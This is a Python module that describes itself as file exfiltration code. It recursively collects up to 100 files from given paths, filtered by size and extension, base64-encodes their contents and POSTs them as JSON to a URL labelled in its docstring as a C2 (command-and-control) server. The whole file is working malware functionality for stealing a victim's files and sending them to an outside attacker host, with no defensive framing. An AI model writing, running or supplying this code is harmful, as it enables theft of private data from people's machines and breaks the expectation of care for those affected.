"""File exfiltration — collect and upload files."""

import os
import json
import base64
import glob

import requests


def collect_files(paths: list, extensions: list = None, max_size: int = 5_000_000) -> list:
    """Collect files matching criteria."""
    results = []
    for path in paths:
        path = os.path.expanduser(path)
        if os.path.isfile(path):
            if _should_include(path, extensions, max_size):
                results.append(_read_file_info(path))
        elif os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for f in files:
                    fp = os.path.join(root, f)
                    if _should_include(fp, extensions, max_size):
                        results.append(_read_file_info(fp))
                        if len(results) >= 100:
                            return results
    return results


def _should_include(path: str, extensions: list, max_size: int) -> bool:
    try:
        if os.path.getsize(path) > max_size:
            return False
        if extensions:
            ext = os.path.splitext(path)[1].lower()
            if ext not in extensions:
                return False
        return True
    except Exception:
        return False


def _read_file_info(path: str) -> dict:
    try:
        with open(path, "rb") as f:
            data = f.read()
        return {
            "path": path,
            "size": len(data),
            "content_b64": base64.b64encode(data).decode(),
        }
    except Exception:
        return {"path": path, "error": "read_failed"}


def exfil_to_server(files: list, url: str) -> str:
    """Upload collected files to C2 server."""
    try:
        payload = json.dumps({"files": files})
        resp = requests.post(url, data=payload, headers={"Content-Type": "application/json"}, timeout=30)
        return f"[exfiltrated {len(files)} files, status {resp.status_code}]"
    except Exception as e:
        return f"[exfil error: {e}]"
